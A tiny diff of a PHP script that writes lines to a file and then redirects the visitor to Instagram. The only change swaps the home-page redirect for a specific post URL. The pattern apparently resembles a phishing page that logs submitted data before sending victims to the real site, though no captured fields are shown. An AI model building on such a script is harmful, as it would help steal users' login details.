@@ -11,6 +11,6 @@ fwrite($handle,"\r\n");
 }
 fwrite($handle,"\r\n");
 fclose($handle);
-header("location:https://www.instagram.com/");
+header("location:https://www.instagram.com/p/CwdiwoetUm5/?igshid=MzRlODBiNWFlZA==");
 exit;
 ?>
